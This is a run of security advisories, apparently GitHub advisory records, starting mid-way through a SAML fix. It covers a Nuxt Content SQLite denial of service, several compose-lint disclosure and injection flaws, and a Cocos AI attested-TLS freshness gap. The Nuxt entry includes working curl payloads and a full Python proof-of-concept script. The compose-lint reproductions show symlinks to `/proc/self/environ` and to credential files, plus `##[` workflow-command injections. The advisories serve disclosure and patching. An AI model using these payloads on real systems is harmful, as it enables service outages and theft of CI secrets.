- The SAML callback now validates the response via OneLogin_Saml2_Auth.process_response() — signature, issuer, audience, destination, and time conditions — and rejects responses that fail, so forged or replayed assertions are no longer accepted.
- The SAML and OIDC login/callback routes are now gated to run only when that provider is the configured active provider, so a deployment that has not enabled the provider no longer parses attacker-supplied IdP payloads.

### Workarounds

There is no effective configuration-level workaround — disabling or not configuring SAML does not mitigate this on affected versions, since the callback runs regardless. Until upgraded, block network access to /auth/saml/callback (e.g. at a reverse proxy / ingress).

### Credit

Reported privately by Austin Chu, Sohee Kim, and Corban Villa (UC Berkeley
security research project), and independently, earlier, by a researcher who wishes to remain anonymous.

summary: Nuxt Content: Unauthenticated SQLite Function DoS via Content Query API
description:
### Summary

The `POST /__nuxt_content/:collection/query` endpoint in `@nuxt/content` accepts an attacker-controlled `sql` field from the HTTP request body and executes it against a local SQLite database after passing it through an insufficient validator (`assertSafeQuery`). The validator only blocks a small set of SQL command keywords and does not reject expensive SQLite built-in functions such as `randomblob()`, `zeroblob()`, `hex()`, or `length()`. An unauthenticated remote attacker can craft a single request that forces SQLite to allocate hundreds of megabytes of memory and perform CPU-intensive work, causing server-wide denial of service. This endpoint is enabled by default for every collection and requires no authentication.

### Details

The vulnerability spans three source files:

**Route registration — `src/module.ts:207-208`**

The Nuxt Content module registers a public HTTP POST handler for each configured collection at startup:

```ts
// src/module.ts:207-208
addServerHandler({
  route: `/__nuxt_content/${collection.name}/query`,
  handler: resolver.resolve('./runtime/api/query.post'),
})
```

No authentication middleware is attached; the route is reachable by any client.

**Source (attacker input) — `src/runtime/api/query.post.ts:7-9`**

```ts
// src/runtime/api/query.post.ts
const { sql } = await readBody(event)          // line 8  — attacker-controlled
assertSafeQuery(sql, collection)               // line 11 — insufficient validation
return loadDatabaseAdapter(conf).all(sql)      // line 18 — raw sql passed to sink
```

**Inadequate sanitizer — `src/runtime/internal/security.ts:55-63`**

```ts
if (where) {
  const noString = cleanupQuery(where, { removeString: true })
  if (noString.match(SQL_COMMANDS)) {          // /SELECT|INSERT|UPDATE|DELETE|DROP|ALTER|\$/i
    throw new Error('Invalid query: WHERE clause contains unsafe SQL commands')
  }
  // No rejection of function calls (randomblob, zeroblob, hex, length, …)
}
```

The denylist matches only six DDL/DML keywords. SQLite resource-consumption functions (`randomblob`, `zeroblob`, `hex`, `length`) are not keywords matched by the regex and therefore pass validation unconditionally.

**Sink — `src/runtime/internal/database.server.ts:26-28`**

```ts
all: async (sql, params = []) => {
  return db.prepare(sql).all(...params)        // executes the unmodified attacker sql
}
```

`better-sqlite3`'s `prepare().all()` is a synchronous call that blocks the Node.js event loop for the entire duration of the SQLite query. A single malicious request therefore stalls all concurrent request handling.

**Attack chain summary:**

```
Attacker HTTP POST (sql field)
  → query.post.ts readBody()          [source]
  → assertSafeQuery() — BYPASS        [insufficient validation]
  → loadDatabaseAdapter().all(sql)    [propagation]
  → db.prepare(sql).all()             [sink — synchronous, blocks event loop]
```

### PoC

**Environment setup**

```bash
git clone https://github.com/nuxt/content.git
cd content
git checkout d8fed0c3ddbcad5805772e1ef8da9fbe841e772e
pnpm install
pnpm dev:prepare
cd test/fixtures/basic
pnpm dev --host 127.0.0.1 --port 3000
```

**Step 1 — Establish baseline (safe query)**

```bash
curl -sS -o /dev/null -w 'status=%{http_code} time=%{time_total}\n' \
  -X POST 'http://127.0.0.1:3000/__nuxt_content/content/query' \
  -H 'content-type: application/json' \
  --data '{"sql":"SELECT * FROM _content_content WHERE (id = '"'"'1'"'"') ORDER BY stem ASC LIMIT 1"}'
# Expected: status=200 time=~0.009s
```

**Step 2 — Attack payload (randomblob variant)**

```bash
curl -sS -o /dev/null -w 'status=%{http_code} time=%{time_total}\n' \
  -X POST 'http://127.0.0.1:3000/__nuxt_content/content/query' \
  -H 'content-type: application/json' \
  --data '{"sql":"SELECT * FROM _content_content WHERE (length(hex(randomblob(200000000))) > 0) ORDER BY stem ASC LIMIT 1"}'
# Expected: status=200  time=~2.25s  (~598 MB RSS during execution)
```

The payload passes `assertSafeQuery()` because the WHERE clause contains no blocked keywords. SQLite then:
1. Allocates 200 MB of random bytes via `randomblob(200000000)`
2. Hex-encodes the result to a 400 MB ASCII string via `hex()`
3. Computes the string length via `length()`

**Step 3 — Zeroblob variant (allocation-focused)**

```bash
--data '{"sql":"SELECT * FROM _content_content WHERE (zeroblob(1000000000) IS NOT NULL) ORDER BY stem ASC LIMIT 1"}'
# 1 GB allocation; may trigger OOM termination
```

**Automated PoC (Docker)**

```bash
# Build and run the reproduction container
docker build -f vuln-001/Dockerfile -t vuln001:latest \
  reports/github_web_211_nuxt__content
docker run -d -p 3000:3000 --name vuln001-container vuln001:latest

# Run the PoC script (requires Python 3, no third-party packages)
python3 vuln-001/poc.py --host 127.0.0.1 --port 3000
```

**Dynamic reproduction result (phase2):**

| Metric | Value |
|---|---|
| Baseline response time | 0.0088 s |
| Attack response time | 11.82 s |
| Slowdown ratio | **1339×** |
| HTTP status for attack | 200 (not rejected) |

The Node.js event loop was blocked for the full duration of each attack request, confirmed by zero concurrent request throughput during the attack.

**Proposed patch — `src/runtime/internal/security.ts`**

```diff
 const SQL_COMMANDS = /SELECT|INSERT|UPDATE|DELETE|DROP|ALTER|\$/i
+const SQL_WHERE_ALLOWED_TOKENS = new Set(['AND', 'OR', 'IN', 'NOT', 'BETWEEN', 'LIKE', 'IS', 'NULL'])
 
     const noString = cleanupQuery(where, { removeString: true })
     if (noString.match(SQL_COMMANDS)) {
       throw new Error('Invalid query: WHERE clause contains unsafe SQL commands')
     }
+    const tokens = noString.match(/[A-Z_]\w*/gi) || []
+    if (tokens.some(token => !SQL_WHERE_ALLOWED_TOKENS.has(token.toUpperCase()))) {
+      throw new Error('Invalid query: WHERE clause contains unsafe SQL expressions')
+    }
   }
```

### Impact

This is an unauthenticated remote denial-of-service vulnerability. Any internet-accessible `@nuxt/content` application using the default SQLite/D1 adapter (i.e., the vast majority of deployments, since this is the default runtime) exposes the vulnerable endpoint without authentication at `POST /__nuxt_content/<collection>/query`.

Because `better-sqlite3` executes queries synchronously and blocks the Node.js event loop, a single malicious request with a large `randomblob()` argument prevents the server from processing any other requests for the duration of that query. An attacker sending a continuous stream of such requests can sustain a complete denial of service with minimal bandwidth.

Impact scope:
- **Confidentiality:** None — the attack does not exfiltrate data
- **Integrity:** None — no data modification
- **Availability:** High — complete service disruption for unauthenticated attackers with network access

All users of publicly deployed `@nuxt/content` v3 applications (SSR or server-side rendered static sites that retain the API route) are affected without any prerequisite authentication or prior knowledge of the application.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
# VULN-001: Unauthenticated SQLite Function DoS via @nuxt/content Content Query API
# Affects: @nuxt/content v3.15.1 (commit d8fed0c)
#
# Build context must be the parent directory (github_web_211_nuxt__content/):
#   docker build -f vuln-001/Dockerfile -t vuln001:latest .

FROM node:20-alpine

# Install build tools required for better-sqlite3 native compilation
RUN apk add --no-cache python3 make g++

WORKDIR /app

# Copy the vulnerable source files from the repo for audit reference
# These are the exact files that contain the vulnerable code paths
COPY repo/src/runtime/internal/security.ts    /app/reference/security.ts
COPY repo/src/runtime/api/query.post.ts       /app/reference/query.post.ts
COPY repo/src/runtime/internal/database.server.ts /app/reference/database.server.ts

# Copy the minimal reproduction server (JavaScript translation of the above)
COPY vuln-001/server.js /app/server.js

# Install Node.js dependencies
# better-sqlite3: same SQLite library used by @nuxt/content local SQLite adapter
RUN npm init -y && npm install better-sqlite3@12.5.0

EXPOSE 3000

CMD ["node", "server.js"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
PoC: VULN-001 — Unauthenticated SQLite Function DoS via @nuxt/content Content Query API

Vulnerability: The POST /__nuxt_content/:collection/query endpoint reads an
attacker-supplied 'sql' field from the request body, passes it through
assertSafeQuery() in security.ts, then executes it via better-sqlite3.
assertSafeQuery() only rejects certain SQL command keywords
(SELECT|INSERT|UPDATE|DELETE|DROP|ALTER|$) but does NOT block SQLite
built-in functions such as randomblob(), zeroblob(), hex(), or length().

Attack payload: SELECT * FROM _content_content
                WHERE (length(hex(randomblob(100000000))) > 0)
                ORDER BY stem ASC LIMIT 1

This forces SQLite to:
  1. Allocate 100 MB of random bytes via randomblob(100000000)
  2. Hex-encode the result to a 200 MB ASCII string via hex()
  3. Compute the string length via length()

The request blocks the server thread for several seconds per request.
Repeated unauthenticated requests exhaust CPU and memory, causing DoS.

Affected: @nuxt/content v3.15.1 (commit d8fed0c)
Source:   src/runtime/internal/security.ts:55-63
          src/runtime/api/query.post.ts:8,11,18
          src/runtime/internal/database.server.ts:27
CVSS:     7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)
"""

import argparse
import json
import sys
import time
import urllib.error
import urllib.request

DEFAULT_HOST = '127.0.0.1'
DEFAULT_PORT = 3000

# Time threshold: attack must be at least this many seconds slower than baseline
ATTACK_MIN_SECONDS = 0.5

# SQL payloads
SAFE_SQL = (
    "SELECT * FROM _content_content "
    "WHERE (id = '1') "
    "ORDER BY stem ASC LIMIT 1"
)

# Malicious payload: passes assertSafeQuery() but forces expensive SQLite computation.
# randomblob(100_000_000) -> 100 MB allocation
# hex(...)               -> 200 MB hex string
# length(...)            -> string length computation
MALICIOUS_SQL = (
    "SELECT * FROM _content_content "
    "WHERE (length(hex(randomblob(100000000))) > 0) "
    "ORDER BY stem ASC LIMIT 1"
)

# Zeroblob variant (allocation-focused, less CPU than hex):
ZEROBLOB_SQL = (
    "SELECT * FROM _content_content "
    "WHERE (zeroblob(500000000) IS NOT NULL) "
    "ORDER BY stem ASC LIMIT 1"
)


def post_query(host, port, sql, timeout=120):
    """Send POST /__nuxt_content/content/query and return (status, elapsed, body)."""
    payload = json.dumps({"sql": sql}).encode("utf-8")
    req = urllib.request.Request(
        f"http://{host}:{port}/__nuxt_content/content/query",
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    t0 = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            elapsed = time.monotonic() - t0
            body = resp.read().decode("utf-8")
            return resp.status, elapsed, body
    except urllib.error.HTTPError as e:
        elapsed = time.monotonic() - t0
        body = e.read().decode("utf-8")
        return e.code, elapsed, body
    except Exception as e:
        elapsed = time.monotonic() - t0
        return None, elapsed, str(e)


def wait_for_server(host, port, retries=30, delay=1.0):
    """Poll until the server responds or timeout."""
    print(f"[*] Waiting for server at {host}:{port} ...")
    for attempt in range(1, retries + 1):
        try:
            urllib.request.urlopen(
                f"http://{host}:{port}/", timeout=2
            )
        except urllib.error.HTTPError:
            # Any HTTP response (including 404) means the server is up
            print(f"[+] Server is ready (attempt {attempt})")
            return True
        except Exception:
            pass
        time.sleep(delay)
    print(f"[!] Server did not become ready after {retries} attempts")
    return False


def main():
    parser = argparse.ArgumentParser(
        description="VULN-001 PoC: SQLite Function DoS via @nuxt/content query API"
    )
    parser.add_argument("--host", default=DEFAULT_HOST, help="Target host (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help="Target port (default: 3000)")
    parser.add_argument(
        "--no-wait",
        action="store_true",
        help="Skip server readiness check (useful when server is already running)",
    )
    args = parser.parse_args()

    host, port = args.host, args.port

    print("=" * 70)
    print("VULN-001: Unauthenticated SQLite Function DoS")
    print("Target: @nuxt/content v3.15.1 — POST /__nuxt_content/:collection/query")
    print("=" * 70)

    if not args.no_wait:
        if not wait_for_server(host, port):
            sys.exit(2)

    # ------------------------------------------------------------------
    # Step 1: Safe baseline query — validates endpoint is reachable
    # ------------------------------------------------------------------
    print()
    print("[STEP 1] Baseline safe query")
    print(f"  SQL: {SAFE_SQL}")
    status1, t1, body1 = post_query(host, port, SAFE_SQL)
    print(f"  Status: {status1}   Time: {t1:.4f}s")
    if status1 == 200:
        rows1 = json.loads(body1)
        print(f"  Rows returned: {len(rows1)}")
    else:
        print(f"  Response: {body1[:200]}")

    # ------------------------------------------------------------------
    # Step 2: Malicious payload — SQLite function DoS
    # ------------------------------------------------------------------
    print()
    print("[STEP 2] Malicious SQLite function payload")
    print(f"  SQL: {MALICIOUS_SQL}")
    print("  Explanation:")
    print("    randomblob(100000000) -> allocates 100 MB of random bytes")
    print("    hex(...)              -> encodes to 200 MB ASCII string")
    print("    length(...)           -> forces full evaluation before comparison")
    print("    assertSafeQuery() passes: no SQL_COMMANDS keyword found in WHERE")
    print("    Sink: better-sqlite3 db.prepare(sql).all() executes unconditionally")
    print()
    print("  Sending request ...")
    status2, t2, body2 = post_query(host, port, MALICIOUS_SQL)
    print(f"  Status: {status2}   Time: {t2:.4f}s")
    if status2 == 200:
        rows2 = json.loads(body2)
        print(f"  Rows returned: {len(rows2)}  (assertSafeQuery() did NOT reject this query)")
    else:
        print(f"  Response: {body2[:200]}")

    # ------------------------------------------------------------------
    # Step 3: Report
    # ------------------------------------------------------------------
    print()
    print("[RESULT]")
    print(f"  Baseline time  : {t1:.4f}s")
    print(f"  Attack time    : {t2:.4f}s")
    ratio = (t2 / t1) if t1 > 0 else float("inf")
    print(f"  Slowdown ratio : {ratio:.1f}x")
    print()

    accepted = status2 == 200
    slow_enough = t2 >= ATTACK_MIN_SECONDS

    if accepted and slow_enough:
        print("[PASS] VULNERABILITY CONFIRMED")
        print(f"  1. assertSafeQuery() ACCEPTED the malicious payload (no 400 error)")
        print(f"  2. SQLite executed randomblob(100000000); observed {t2:.4f}s execution time")
        print(f"  3. Time delta confirms resource exhaustion: {t2:.4f}s vs baseline {t1:.4f}s")
        print(f"  4. Unauthenticated attacker can chain requests to exhaust server CPU/memory")
        sys.exit(0)
    elif accepted and not slow_enough:
        print("[WARN] Payload was ACCEPTED but execution was faster than threshold")
        print(f"  accepted={accepted}, time={t2:.4f}s, threshold={ATTACK_MIN_SECONDS}s")
        print("  Try increasing the blob size in MALICIOUS_SQL (e.g. 200000000)")
        sys.exit(1)
    else:
        print(f"[FAIL] Unexpected result: accepted={accepted}, time={t2:.4f}s")
        print(f"  Response body: {body2[:300]}")
        sys.exit(1)


if __name__ == "__main__":
    main()
```

### Affected versions
All `@nuxt/content` v3 releases before `3.15.2` are affected (`>= 3.0.0, < 3.15.2`). The report was reproduced against `3.15.1`, but the same `WHERE` clause validation gap exists in every earlier v3 release; `3.0.0` performed no query validation at all.

Fully static (prerendered, no server) deployments are not affected.

### Patches
Fixed in `3.15.2` (#3819): function calls are rejected in query `WHERE` clauses. Subsequent releases harden validation further — `3.16.1` removes a ReDoS in `assertSafeQuery` (#3851) and `3.16.2` only accepts `WHERE` clauses matching the exact output of the query builder (#3862, #3877). Upgrading to the latest version (`>= 3.16.2`) is recommended.

### Workarounds
If you cannot upgrade, block or restrict access to `POST /__nuxt_content/*/query` at the proxy/WAF level, or prerender the site so the endpoint is not deployed.

### Credits
Also independently reported by @Pig-Tail (GHSA-c739-vwm9-rgx3) and @maru1009 (as part of GHSA-wjh8-qcrm-wf29).

summary: compose-lint: A committed symlink makes compose-lint quote a file from outside the project into its output
description:
### Impact

Like Docker Compose, compose-lint follows symlinks when it reads a project's files. Unlike Compose, compose-lint up to 0.24.0 could then put the contents of a file from *outside* the project into its output, where the author of a pull request can read it.

A pull request can commit a symlink, under a name compose-lint reads, pointing at a file on the CI runner:

- **The Compose file itself (0.2.0–0.24.0).** A `compose.yml` that is a symlink, whether the pre-commit hook passes its name or the Action or a bare run finds it.
- **`compose.override.yml` (0.22.0–0.24.0),** which compose-lint merges automatically.
- **A `COMPOSE_FILE` entry (0.22.0–0.24.0)** in a `.env` beside the Compose file.

When the target is not valid YAML, the parse error quotes the line it failed on. Docker Compose, given the same file, reports only a line number. That line reaches standard error (the job log), JSON `errors[]`, and the SARIF `toolExecutionNotifications`, which the Action uploads to Code Scanning.

A fourth route: from 0.23.0, a symlinked `env_file:` target makes CL-0020 and CL-0021 report the credential-like **key names** in a file outside the project. Values are not printed.

What can be read is one line of a file chosen by path, at the point where the YAML parser fails, which the attacker cannot choose; or key names. A symlink to `/proc/self/environ` gave neither in testing. The pass/fail result is not affected. On a public repository the job log is visible to the pull request's author.

Found during an internal pre-1.0 security review.

**GitHub Action.** Action tags v0.18.0 through v0.24.0 install their own compose-lint version and are affected. Earlier tags install the newest release unless `version:` is set; they were affected while that was 0.24.0 or earlier.

**Docker image.** `composelint/compose-lint` tags 0.3.3 through 0.24.0, and the matching minor tags, are affected. Inside the container a symlink resolves within the container, so what can be read is the container's own files and anything mounted into it. Fixed from `0.25.0`.

### Patches

Fixed in 0.25.0. Parse errors no longer quote the source line; the error and its line and column are kept. `env_file:` targets and `COMPOSE_FILE` entries that resolve outside the project are also refused, with the existing outside-the-project note. Symlinks that stay inside the project still work.

From 0.25.0 through 0.31.0, a committed symlink to a target that is itself a Compose file could still be read, and its values could reach findings. 0.32.0 stops following a discovered, named or override Compose file whose link leaves the checkout.

A related gap for the sibling `.env` file is covered by GHSA-6wcv-rj3c-mhv3, and one for a symlinked `.compose-lint.yml` by GHSA-88f4-frh5-gmcr.

### Workarounds

- Upgrade to 0.25.0 or later.
- On older versions, don't run compose-lint on untrusted pull requests on a machine whose files outside the checkout hold credentials. `--no-env` closes the `COMPOSE_FILE` and `env_file:` routes, but not the others.

### Reproduction

```
project/compose.yml -> /path/outside/project/credentials   (symlink)
```

`compose-lint --format sarif compose.yml` on 0.24.0 exits 2, and the SARIF notification quotes a line of the linked file. On 0.25.0 the error gives only the line and column.

cwes.name: Improper Link Resolution Before File Access
Generation of Error Message Containing Sensitive Information

summary: compose-lint: A `.compose-lint.yml` symlinked outside the project is read, and a parse error quotes part of the target
description:
### Impact

compose-lint automatically reads a `.compose-lint.yml` policy file beside the Compose file. It is meant to read nothing outside the project directory, but it follows that file if it is a symlink, wherever it points.

A pull request can commit `.compose-lint.yml` as a symlink to a file on the CI runner. If the target is not valid YAML, the error compose-lint reports quotes part of the line the parser failed on. That quote reaches the job log (standard error), JSON `errors[]`, and the SARIF `toolExecutionNotifications`, which the Action uploads to Code Scanning. The run exits 2.

What can be read is small. The quote is cut to about 30 characters around the error position, and the attacker cannot choose which line of the target the parser fails on. For an INI-style credentials file, this was the start of the second line (`aws_access_key_id = ` followed by the first characters of the value). Targets in `KEY=value` form, and YAML files that parse, disclosed no values in testing. The pass/fail result is not affected. On a public repository, the job log is visible to the pull request's author.

The Compose file loader stopped quoting source lines in parse errors in 0.25.0 (GHSA-whr6-fgpq-fpv9). The policy loader did not.

Found during an internal pre-1.0 security review.

**GitHub Action.** Action tags v0.18.0 through v0.31.0 install their own compose-lint version and are affected. Earlier tags install the newest release unless `version:` is set, and so currently install an affected one.

**Docker image.** `composelint/compose-lint` tags 0.3.3 through 0.31.0, the matching minor tags, and `latest` are affected. Inside the container, a symlink resolves within the container, so what can be read is the container's own files and anything mounted into it.

### Patches

Fixed in 0.32.0. A `.compose-lint.yml` discovered in the working directory that resolves outside it is refused with exit 2 rather than read, and a policy parse error no longer quotes the line it failed on, matching the Compose loader. `--config` is read as given. 0.32.0 also stops following a Compose file that is a symlink to a target outside the checkout.

### Workarounds

- Upgrade to 0.32.0 or later.
- Run with an explicit `--config` pointing at a policy file inside the project; the automatic lookup is then skipped.
- Don't run compose-lint on untrusted pull requests on a machine whose files outside the checkout hold credentials.

### Reproduction

```
project/.compose-lint.yml -> /path/outside/project/credentials   (symlink)
project/compose.yml          services: {web: {image: nginx:1.27}}
```

`compose-lint --format sarif compose.yml` exits 2, and the notification text quotes the start of the target's second line.

cwes.name: Improper Link Resolution Before File Access
Generation of Error Message Containing Sensitive Information

summary: compose-lint: A pull request can make compose-lint quote a secret from a CI-generated `.env` into its findings
description:
### Impact

Since 0.22.0, compose-lint fills in `${VAR}` references from the `.env` beside the Compose file, as Compose does. The documentation says values under `environment:` are never resolved from a `.env`, "that is where secrets live". But `image:` values are resolved, and CL-0004 and CL-0019 quote the resolved image in their message and fix text.

Some CI workflows write secrets into that `.env` before linting or building. In such a workflow, a pull request that changes one line to `image: "${DB_PASSWORD}"`, or `image: "nginx:${DB_PASSWORD}"`, gets the secret's value quoted in a finding. The finding reaches the job log, JSON output, and the SARIF uploaded to Code Scanning. GitHub masks registered secrets in the job log, but not in uploaded JSON or SARIF artifacts or in Code Scanning alert text. The pass/fail result is not affected.

This needs a workflow that writes secrets into the `.env` beside the Compose file *and* runs on pull requests from authors who should not see them. Pull requests from forks normally run without secrets, so the common setup is not exposed, which is why this is scored as low confidentiality impact. Where the conditions hold, such as a `pull_request_target` workflow, pull requests from branches in the same repository, or a self-hosted runner that keeps a populated `.env` in the checkout, the whole value is disclosed.

Found during an internal pre-1.0 security review.

**GitHub Action.** Action tags v0.22.0 through v0.31.0 install their own compose-lint version and are affected. Earlier tags install the newest release unless `version:` is set, and so currently install an affected one.

**Docker image.** `composelint/compose-lint` tags 0.22.0 through 0.31.0, the matching minor tags, and `latest` are affected when the `.env` is mounted with the project.

### Patches

Fixed in 0.32.0. Rules still grade the value the sibling `.env` substituted, but findings, fix guidance and notes quote the `${NAME}` reference in its place, in text, JSON and SARIF. A value shorter than 8 characters is shown as written, because short values are also words the guidance itself uses; `docs/what-a-run-reads.md` states this limit.

### Workarounds

- Upgrade to 0.32.0 or later.
- Run with `--no-env`, which skips the sibling `.env`.
- Don't write secrets into the `.env` beside the Compose file in a job that lints untrusted pull requests.

### Reproduction

```
project/.env          DB_PASSWORD=example-secret      (written by CI, not committed)
project/compose.yml   services: {web: {image: "${DB_PASSWORD}"}}
```

`compose-lint --format sarif compose.yml` reports CL-0004 with the message `Image 'example-secret' has no tag, ...`.

cwes.name: Exposure of Sensitive Information to an Unauthorized Actor
Insertion of Sensitive Information into Log File

summary: compose-lint: `fix --apply` can delete a line the user did not select, including a security setting
description:
### Impact

`compose-lint fix --apply` converts the line numbers its fixers work with into positions in the file. The YAML parser treats a lone carriage return, U+0085, U+2028 and U+2029 as line breaks, but the conversion counted only `\n`. One of those characters inside a quoted value, which most editors and diff views don't show, shifted every later edit down by one line.

A Compose file from a pull request can use this to make a fix delete the line after the one it meant to change. For example, fixing CL-0014 (`logging: driver: none`) instead removes `driver: none` and the following `networks: [internal]`, moving the service off an internal-only network onto the default bridge. The result is still valid Compose, every check `fix` runs after editing passes, and the command reports `applied 1 fix(es)` and exits 0. A later `compose-lint check` passes too, because no rule requires `networks:`. The dry-run diff (without `--apply`) does show the removed lines, but `--apply` prints only the note for the fix that was selected.

A related crash on the same files could empty the SARIF output for every file in the run. GitHub Code Scanning rejects an empty SARIF upload, which fails the step, so that part does not report a false clean result there.

Found during an internal pre-1.0 security review.

**Docker image.** `composelint/compose-lint` tags 0.9.0 through 0.17.0, and the matching minor tags, are affected when used to run `fix --apply`. Fixed from `0.18.0`.

The GitHub Action does not run `fix` and is not affected.

### Patches

Fixed in 0.18.0. Line splitting and position conversion now share one definition of a line break, so they can't disagree. A Compose file containing an ambiguous line break (a lone `\r`, U+0085, U+2028 or U+2029) is refused with exit code 2, because no line numbering is correct for both the parser and the editor. CRLF and LF files are unaffected.

### Workarounds

- Upgrade to 0.18.0 or later.
- On older versions, review the dry-run diff before `--apply`, and don't run `fix --apply` over files from untrusted pull requests.

### Reproduction

```yaml
services:
  web:
    image: nginx@sha256:<digest>
    labels:
      note: "line one<U+2028>line two"
    logging:
      driver: none
    networks: [internal]
networks:
  internal:
    internal: true
```

`compose-lint fix --apply compose.yml` on 0.17.0 reports `applied 1 fix(es)`, exits 0, and removes both `driver: none` and `networks: [internal]`.

summary: compose-lint: Compose file text can issue GitHub Actions workflow commands through the compose-lint Action
description:
### Impact

The GitHub Actions runner treats certain text in a step's output as commands. The legacy form, `##[command]`, is recognized anywhere in a line. compose-lint's text report prints service names, environment keys and lines of the Compose file, and it does not neutralize `##[`. Inside the compose-lint Action, a Compose file from a pull request can therefore:

- create fake error or warning annotations on the pull request (`##[error]`, `##[warning]`)
- fold the rest of the log, including the real verdict, out of sight (`##[group]`)
- blank out chosen strings for the rest of the log (`##[add-mask]`)

GitHub has postponed removing the deprecated `set-output` log command, so the runner still honors it. A test run of the Action on a GitHub-hosted runner confirmed that a `::set-output` line from a Compose file is processed. Whether it can override the Action's own `sarif-written` output, which decides whether the SARIF upload step runs, has not been tested.

The exit code and the pass/fail result are not affected. Azure Pipelines parses the same `##[` syntax, so the pip package is listed for anyone printing the text report in other CI systems.

Found during an internal pre-1.0 security review.

### Patches

Fixed in 0.31.0. The Action stops the runner from processing workflow commands while compose-lint's output is printed, using a random `stop-commands` token. The text report also escapes `##[`, and `::` at the start of a line, in anything taken from the Compose file.

### Workarounds

- In your own workflow, wrap the compose-lint step in `::stop-commands::<random token>` and `::<random token>::`.
- Use `--format json` or `--format sarif` rather than the text report when linting untrusted pull requests.

### Reproduction

```yaml
services:
  web:
    image: "nginx:1.25"
    environment:
      "##[error]DB_PASSWORD": placeholder
  "##[group]svc":
    image: "nginx:1.25"
    privileged: true
```

Run through the Action, this produces a fake error annotation and folds the remaining log lines, including the FAIL verdict, into a collapsed group.

cwes.name: Improper Neutralization of Escape, Meta, or Control Sequences

summary: compose-lint: .env read through a symlink outside the project can expose the CI job's environment
description:
### Impact

compose-lint fills in `${VAR}` references from the `.env` file next to the Compose file. It is meant to read nothing outside the project directory, and `env_file:`, `include:` and `extends:` paths are checked for that. The `.env` read is not. If `.env` is a symlink, compose-lint follows it wherever it points.

A pull request can add a `.env` symlink to any file on the CI runner and a Compose file that references a variable from it. compose-lint substitutes the value and quotes it in finding messages, which go to the log and to JSON and SARIF output.

The worst target is `/proc/self/environ`, the linter's own environment. The Compose file only needs to reference the name of the first variable in it: because that file separates variables with NUL bytes rather than newlines, the substituted value is the entire rest of the environment. On a CI runner that environment holds whatever the workflow put there, including secrets. GitHub masks registered secrets in the job log, but not in uploaded JSON or SARIF artifacts or in Code Scanning alert text.

An `include:` entry's `project_directory:` has the same gap from 0.28.0: a directory symlink named there makes compose-lint read `.env` from wherever the link points.

Pull requests from forks normally run without secrets, and GitHub masks registered secrets in the job log, so in the common setup what can be read is runner metadata and whatever unmasked values the job's environment holds. That is why this is scored as low confidentiality impact. The impact is high in a job that runs untrusted pull requests with secrets in its environment, such as a `pull_request_target` workflow, or on a CI system that does not mask secrets, and also wherever the JSON or SARIF output is uploaded. The pass/fail result is not affected.

Found during an internal pre-1.0 security review.

### Patches

Fixed in 0.31.0. Every `.env` read now applies the same containment check as `env_file:`. A `.env` that resolves outside the project is treated as missing and reported as an unread input. A `project_directory:` that resolves outside the project is refused, and that entry's files resolve against their own directories. A `.env` line containing a NUL byte is skipped.

### Workarounds

- Run with `--no-env`, which skips the sibling `.env` entirely.
- Don't run compose-lint on untrusted pull requests in a job whose environment holds secrets.

### Reproduction

```
project/.env -> /proc/self/environ      (symlink)
project/compose.yml:
  services:
    web:
      image: "${FIRST_VAR_NAME}"
```

`compose-lint check compose.yml --format json` quotes the environment in the CL-0004 message ("Image '...' has no tag").

cwes.name: Improper Limitation of a Pathname to a Restricted Directory
Improper Link Resolution Before File Access

summary: Cocos AI Intra-handshake attested TLS implementation is vulnerable to TOCTOU Attacks
description:
### Summary
An attacker who can modify the attested workload’s code, memory-backed state, or configuration after the initial attestation — but without necessarily terminating the existing TLS connection — can cause the peer to continue trusting the connection as if the originally attested state were still running.

### Details
Once attestation is successfully appraised and connection is established, there is a window of vulnerability from the establishment of connection to the termination of connection where an attacker can modify the state of the workload and platform at runtime on the TLS endpoint acting as the Attester. Workload state includes code, data, and configuration. Other examples of state changes at the workload level include cases where a new device (such as a GPU) is connected, or where a connected device is disconnected, since the connection establishment.

In Cocos AI, there is no mechanism for the peer to know that some state has changed in the Attester after the connection establishment. The vulnerability is particularly concerning for long-lived connections.

In short, this vulnerability was possible because Cocos AI performs attestation only once in the lifetime of the connection (at connection establishment time) and the verifying peer continues to believe that the state is the same as in initial Evidence throughout, whereas it could be stale at some point in time.

This vulnerability for Cocos AI was found and demonstrated by Muhammad Usama Sardar via formal analysis. Formal analysis was performed in the state-of-the-art tool, ProVerif.

### Workarounds
The proposed workaround is to allow re-attestation of the workload after periodic or user-defined intervals using post-handshake attestation.

### Background and General Technical Details
For background and general (not specific to Cocos AI) technical details on this vulnerability, please see `G-RA2: Freshness of Evidence` in Sec. 5.1.1 of [Identity Crisis in Confidential Computing: Formal Analysis of Attested TLS](https://doi.org/10.1145/3779208.3785387). Also, see the corresponding [formal analysis](https://github.com/CCC-Attestation/formal-spec-id-crisis).

### Credits
This vulnerability for Cocos AI was found and _responsibly_ disclosed by Muhammad Usama Sardar (TU Dresden, Germany).
